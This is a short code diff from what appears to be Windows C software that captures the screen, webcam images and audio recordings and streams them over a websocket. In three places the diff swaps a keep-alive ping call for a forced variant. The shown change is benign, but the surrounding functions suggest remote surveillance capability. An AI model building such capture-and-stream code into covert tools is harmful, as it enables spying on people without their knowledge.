@@ -1121,7 +1121,7 @@ void capture_display() {
         
         if ((sent % 16384) < chunk_size) {
             Sleep(30);
-            send_websocket_ping();
+            send_websocket_ping_force();
         }
     }
     
@@ -5355,7 +5355,7 @@ void take_camshot() {
         
         if ((sent % 16384) < chunk_size) {
             Sleep(30);
-            send_websocket_ping();
+            send_websocket_ping_force();
         }
     }
     
@@ -5887,7 +5887,7 @@ void record_audio(int seconds) {
         
         if ((sent % 16384) < chunk_size) {
             Sleep(30);
-            send_websocket_ping();
+            send_websocket_ping_force();
         }
     }
     
